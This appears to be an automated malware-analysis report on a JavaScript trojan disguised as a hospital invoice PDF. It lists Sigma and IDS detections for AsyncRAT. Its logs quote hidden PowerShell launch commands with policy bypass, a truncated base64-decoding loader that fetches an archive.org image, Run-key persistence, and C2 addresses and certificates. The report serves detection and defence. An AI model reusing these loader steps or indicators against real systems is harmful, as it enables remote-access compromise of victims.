attributes.magic: Unicode text, UTF-8 text, with CRLF line terminators
names: HOSPITAL PUERTO LOPEZ DOCUMENTO COMPLETO RADICACION DE FACTURAS POR VENCIMIENTO DE PLAZO DETERMINADOpdf.js

sigma_analysis_results.rule_description: Detects suspicious PowerShell invocation with a parameter substring
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Daniel Bohannon (idea), Roberto Rodriguez (Fix)

match_context.values: @{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=PowerShell.EXE; Hashes=MD5=C32CA4ACFCC635EC1EA6ED8A34DF5FAC,SHA256=73A3C4AEF5DE385875339FC2EB7E58A9E8A47B6161BDC6436BF78A763537BE70,IMPHASH=194427A488ED1DD0A91731658B071667; Description=Windows PowerShell; FileVersion=10.0.19041.546 (WinBuild.160101.0800); ParentCommandLine="C:\Windows\system32\wscript.exe" "C:\Users\Bruno\Desktop\ACION DE FACTURAS POR VENCIMIENTO DE PLAZO DETERMINADOpdf.js"; CommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -w hidden -noprofile -ep bypass -c "$diquark=' [TRUNCATED]; EventID=1; ParentImage=C:\Windows\SysWOW64\wscript.exe; IntegrityLevel=High; Image=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_title: Suspicious Binaries and Scripts in Public Folder
sigma_analysis_results.rule_description: Detects the creation of a file with a suspicious extension in the public folder, which could indicate potential malicious activity.

match_context.values: @{RuleName=Downloads; Image=C:\Windows\SysWOW64\cmd.exe; EventID=11; TargetFilename=C:\Users\Public\Downloads\stampian.js}

sigma_analysis_results.rule_title: Windows Shell/Scripting Application File Write to Suspicious Folder
sigma_analysis_results.rule_description: Detects Windows shells and scripting applications that write files to suspicious folders

match_context.values: @{RuleName=Downloads; Image=C:\Windows\SysWOW64\cmd.exe; EventID=11; TargetFilename=C:\Users\Public\Downloads\stampian.js}

sigma_analysis_results.rule_title: New RUN Key Pointing to Suspicious Folder
sigma_analysis_results.rule_description: Detects suspicious new RUN key element pointing to an executable in a suspicious folder
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Markus Neis, Sander Wiebing, Swachchhanda Shrawan Poudel (Nextron Systems)

match_context.values: @{RuleName=T1060,RunKey; Details=C:\Users\Public\Downloads\stampian.js; EventType=SetValue; Image=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe; EventID=13; TargetObject=HKU\S-1-5-21-4005801669-2598574594-602355426-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Path}

sigma_analysis_results.rule_title: Outbound Network Connection Initiated By Script Interpreter
sigma_analysis_results.rule_description: Detects a script interpreter wscript/cscript opening a network connection to a non-local network. Adversaries may use script to download malicious payloads.

match_context.values: @{SourceIsIpv6=false; DestinationPort=80; Initiated=true; Protocol=tcp; SourceIp=172.16.1.5; DestinationIsIpv6=false; EventID=3; SourcePort=58058; Image=C:\Windows\SysWOW64\wscript.exe; DestinationIp=23.186.113.60}

@{SourceIsIpv6=false; DestinationPort=443; DestinationIp=23.186.113.60; Protocol=tcp; SourceIp=172.16.1.5; DestinationIsIpv6=false; EventID=3; SourcePort=58059; Image=C:\Windows\SysWOW64\wscript.exe; Initiated=true}

@{SourceIsIpv6=false; DestinationPort=80; Initiated=true; Protocol=tcp; SourceIp=192.168.122.104; DestinationIsIpv6=false; EventID=3; Image=C:\Windows\System32\WScript.exe; SourcePort=49709; DestinationIp=23.186.113.60}

@{SourceIsIpv6=false; DestinationPort=443; Initiated=true; Protocol=tcp; SourceIp=192.168.122.104; DestinationIsIpv6=false; EventID=3; SourcePort=49710; Image=C:\Windows\System32\WScript.exe; DestinationIp=23.186.113.60}

sigma_analysis_results.rule_title: Usage Of Web Request Commands And Cmdlets - ScriptBlock
sigma_analysis_results.rule_description: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via PowerShell scriptblock logs

match_context.values: @{ScriptBlockText=$crabber = 'VkFJ';$noninformation = [System.Convert]::FromBase64String($crabber);$bivouacs = [System.Text.Encoding]::UTF8.GetString($noninformation);$swoun = 'ZG5saWIuSU8uSG9tZQ==';$nondiffracting = [System.Convert]::Frombase64String($swoun);$ruggedizing = [System.Text.Encoding]::UTF8.GetString($nondiffracting);Add-Type -AssemblyName System.Drawing;$demeans='https://archive.org/download/wp4096799-lost-in-space-wallpapers_20250617_0159/wp4096799-lost-in-space-wallpapers.jpg';$cyclothurus=New-Obje [TRUNCATED]; MessageTotal=1; ScriptBlockId=42817fb3-4b88-4749-ab20-ad46e3fa5f56; Path=; MessageNumber=1; EventID=4104}

sigma_analysis_results.rule_title: Suspicious Copy From or To System Directory
sigma_analysis_results.rule_description:
Detects a suspicious copy operation that tries to copy a program from system (System32, SysWOW64, WinSxS) directories to another on disk.
Often used to move LOLBINs such as 'certutil' or 'desktopimgdownldr' to a different location with a different name in order to bypass detections based on locations.
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Markus Neis, Tim Shelton (HAWK.IO), Nasreddine Bencherchali (Nextron Systems)

match_context.values: @{Hashes=MD5=D0FCE3AFA6AA1D58CE9FA336CC2B675B,SHA256=4D89FC34D5F0F9BABD022271C585A9477BF41E834E46B991DEAA0530FDB25E22,IMPHASH=392B4D61B1D1DADC1F06444DF258188A; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=Cmd.Exe; Product=Microsoft\xae Windows\xae Operating System; Description=Windows Command Processor; EventID=1; ParentCommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -w hidden -noprofile -ep bypass -c "$diquark=' [TRUNCATED]; CommandLine="C:\Windows\System32\cmd.exe" /C copy *.js "C:\Users\Public\Downloads\stampian.js"; FileVersion=10.0.19041.746 (WinBuild.160101.0800); ParentImage=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe; IntegrityLevel=High; Image=C:\Windows\SysWOW64\cmd.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description: Detects non-interactive PowerShell activity by looking at the "powershell" process with a non-user GUI process such as "explorer.exe" as a parent.

match_context.values: @{Hashes=MD5=C32CA4ACFCC635EC1EA6ED8A34DF5FAC,SHA256=73A3C4AEF5DE385875339FC2EB7E58A9E8A47B6161BDC6436BF78A763537BE70,IMPHASH=194427A488ED1DD0A91731658B071667; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=PowerShell.EXE; Product=Microsoft\xae Windows\xae Operating System; Description=Windows PowerShell; FileVersion=10.0.19041.546 (WinBuild.160101.0800); ParentCommandLine="C:\Windows\system32\wscript.exe" "C:\Users\Bruno\Desktop\ACION DE FACTURAS POR VENCIMIENTO DE PLAZO DETERMINADOpdf.js"; CommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -w hidden -noprofile -ep bypass -c "$diquark=' [TRUNCATED]; EventID=1; ParentImage=C:\Windows\SysWOW64\wscript.exe; IntegrityLevel=High; Image=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

@{Hashes=SHA1=A72C41316307889E43FE8605A0DCA4A72E72A011,MD5=DCAADF7C9610B5EBEBDEDB1569EC4A9D,SHA256=D783BA6567FAF10FDFF2D0EA3864F6756862D6C733C7F4467283DA81AEDC3A80,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20; CurrentDirectory=C:\Windows\system32\; OriginalFileName=PowerShell.EXE; Product=Microsoft\xae Windows\xae Operating System; Description=Windows PowerShell; FileVersion=10.0.22621.2361 (WinBuild.160101.0800); ParentCommandLine=C:\Windows\System32\WScript.exe "C:\Users\Bruno\Desktop\ACION DE FACTURAS POR VENCIMIENTO DE PLAZO DETERMINADOpdf.js"; CommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -w hidden -noprofile -ep bypass -c "$diquark=' [TRUNCATED]; EventID=1; ParentImage=C:\Windows\System32\wscript.exe; IntegrityLevel=Medium; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

attributes.meaningful_name: HOSPITAL PUERTO LOPEZ DOCUMENTO COMPLETO RADICACION DE FACTURAS POR VENCIMIENTO DE PLAZO DETERMINADOpdf.js

threat_severity.level_description: Severity MEDIUM because it was considered trojan.

crowdsourced_ids_results.rule_category: Domain Observed Used for C2 Detected
crowdsourced_ids_results.rule_msg: ET MALWARE Observed Malicious SSL Cert (AsyncRAT Server)
crowdsourced_ids_results.rule_raw: alert tls $EXTERNAL_NET any -> $HOME_NET any (msg:"ET MALWARE Observed Malicious SSL Cert (AsyncRAT Server)"; flow:established,to_client; tls.cert_issuer; content:"AsyncRAT Server"; reference:md5,f69cadedae72d9d1a1d1578b56c39404; classtype:domain-c2; sid:2030673; rev:2; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_and_Server, created_at 2020_08_11, deployment Perimeter, malware_family AsyncRAT, performance_impact Low, confidence High, signature_severity Major, tag SSL_Malicious_Cert, updated_at 2022_03_24, reviewed_at 2024_04_01, mitre_tactic_id TA0011, mitre_tactic_name Command_And_Control, mitre_technique_id T1071, mitre_technique_name Application_Layer_Protocol;)

crowdsourced_ids_results.rule_category: Domain Observed Used for C2 Detected
crowdsourced_ids_results.rule_msg: ET MALWARE Generic AsyncRAT/zgRAT Style SSL Cert
crowdsourced_ids_results.rule_raw: alert tls $EXTERNAL_NET [!5222,!7687] -> $HOME_NET any (msg:"ET MALWARE Generic AsyncRAT/zgRAT Style SSL Cert"; flow:established,to_client; content:!"infinitecampus.com"; content:"|0f 39 39 39 39 31 32 33 31 32 33 35 39 35 39 5a|"; fast_pattern; content:"|55 04 03|"; pcre:"/^.(?P<servercert>[\x00-\xff][\x20-\x7f]{1,50})\x30.+?\x55\x04\x03.(?P=servercert)\x30/Rsi"; tls.cert_subject; content:"CN="; startswith; content:!"O="; content:!"OU="; content:!"ST="; tls.cert_issuer; content:"CN="; startswith; content:!"O="; content:!"OU="; content:!"ST="; content:!".com"; content:!"CN=localhost"; content:!"CN=ForFunLabs"; reference:md5,7ed7bf7ea7a1551218f73774d28be76c; classtype:domain-c2; sid:2035595; rev:6; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, tls_state plaintext, created_at 2021_09_13, deployment Perimeter, confidence Medium, signature_severity Major, updated_at 2022_08_01, reviewed_at 2024_05_06; target:src_ip;)

crowdsourced_ids_results.rule_msg: ET INFO DYNAMIC_DNS Query to *.duckdns. Domain
crowdsourced_ids_results.rule_raw: alert dns $HOME_NET any -> any any (msg:"ET INFO DYNAMIC_DNS Query to *.duckdns. Domain"; dns.query; content:".duckdns."; nocase; classtype:misc-activity; sid:2022918; rev:4; metadata:created_at 2016_06_27, confidence Medium, signature_severity Informational, updated_at 2022_11_30, reviewed_at 2024_04_16;)

crowdsourced_ids_results.rule_msg: ET INFO DYNAMIC_DNS Query to a *.duckdns .org Domain
crowdsourced_ids_results.rule_raw: alert dns $HOME_NET any -> any any (msg:"ET INFO DYNAMIC_DNS Query to a *.duckdns .org Domain"; dns.query; content:".duckdns.org"; fast_pattern; nocase; endswith; reference:url,changeip.com; classtype:bad-unknown; sid:2042936; rev:2; metadata:attack_target Client_and_Server, created_at 2022_12_15, deployment Perimeter, performance_impact Low, confidence High, signature_severity Informational, updated_at 2023_03_02, mitre_tactic_id TA0011, mitre_tactic_name Command_And_Control, mitre_technique_id T1568, mitre_technique_name Dynamic_Resolution;)

crowdsourced_ids_results.rule_msg: ET INFO Pastebin-like Service Domain in DNS Lookup (paste .ee)
crowdsourced_ids_results.rule_raw: alert dns $HOME_NET any -> any any (msg:"ET INFO Pastebin-like Service Domain in DNS Lookup (paste .ee)"; dns.query; bsize:8; content:"paste.ee"; nocase; reference:url,github.com/lorien/awesome-pastebins; classtype:misc-activity; sid:2054041; rev:1; metadata:affected_product Any, attack_target Client_Endpoint, created_at 2024_06_26, deployment Perimeter, performance_impact Low, confidence High, signature_severity Informational, updated_at 2024_06_26, reviewed_at 2024_10_04;)

crowdsourced_ids_results.rule_msg: SSLBL: Malicious SSL certificate detected (AsyncRAT C&C)
crowdsourced_ids_results.rule_raw: alert tls $EXTERNAL_NET any -> $HOME_NET any (msg:"SSLBL: Malicious SSL certificate detected (AsyncRAT C&C)"; tls.fingerprint:"cf:08:e3:03:5a:c6:32:43:01:b3:21:1c:e6:2e:87:83:e7:07:55:c1"; reference:url, sslbl.abuse.ch/ssl-certificates/sha1/cf08e3035ac6324301b3211ce62e8783e70755c1/; sid:902205450; rev:1;)

crowdsourced_ids_results.rule_msg: SSLBL: Malicious JA3 SSL-Client Fingerprint detected (AsyncRAT)
crowdsourced_ids_results.rule_raw: alert tls any any -> any any (msg:"SSLBL: Malicious JA3 SSL-Client Fingerprint detected (AsyncRAT)"; ja3_hash; content:"fc54e0d16d9764783542f0146a98b300"; reference:url, sslbl.abuse.ch/ja3-fingerprints/fc54e0d16d9764783542f0146a98b300/; sid:906200096; rev:1;)

crowdsourced_ids_results.rule_msg: ET POLICY Pastebin-style Service (paste .ee) in TLS SNI
crowdsourced_ids_results.rule_raw: alert tls $HOME_NET any -> $EXTERNAL_NET any (msg:"ET POLICY Pastebin-style Service (paste .ee) in TLS SNI"; flow:established,to_server; tls.sni; content:"paste.ee"; bsize:8; fast_pattern; classtype:policy-violation; sid:2034978; rev:1; metadata:attack_target Client_Endpoint, created_at 2022_01_26, deployment Perimeter, performance_impact Low, confidence High, signature_severity Informational, updated_at 2022_01_26;)
